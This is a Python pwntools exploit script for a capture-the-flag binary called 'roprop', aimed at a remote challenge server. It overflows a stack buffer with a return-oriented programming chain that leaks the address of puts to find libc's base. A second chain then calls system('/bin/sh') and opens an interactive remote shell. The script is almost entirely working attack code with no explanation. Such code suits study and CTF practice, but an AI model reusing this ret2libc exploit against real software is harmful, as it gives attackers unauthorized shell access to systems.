#! /usr/bin/env python
from pwn import *

program = "./roprop"

#proc = process(program)
proc = remote('pwn.darkarmy.xyz', 5002)

elf_prog = ELF(program)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#pid = gdb.attach(proc, '''
#    set pagination off
#    set disassembly-flavor intel    
#    b * 0x04008fd
#    continue
#    b * 0x0400963    
#    '''
#    )

plt_puts = elf_prog.plt['puts']
got_puts = elf_prog.got['puts']
main = elf_prog.symbols['main']

gadget2 = 0x00400963 # pop rdi; ret;
align_gadget = 0x00400646 # ret;
# align
payload = b'A'*88 + p64(align_gadget) + p64(gadget2) + p64(got_puts) + p64(plt_puts) + p64(main)  

proc.recvuntil("19's.\n")

proc.sendline(payload)
proc.recvuntil("\n")
libc_puts = proc.recvline()
# leak base address
libc_puts = u64(libc_puts[:-1].ljust(8, b'\x00'))
libc_base = libc_puts - libc.symbols['puts'] 
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search('/bin/sh').next()
print('libc_puts: ' + str(hex(libc_puts)))
print('libc_base: ' + str(hex(libc_base)))
print('libc_system: ' + str(hex(libc_system)))

proc.recvuntil("19's.\n")

payload = b'A'*88 + p64(gadget2) + p64(libc_binsh) + p64(libc_system) 

proc.sendline(payload)

proc.interactive()




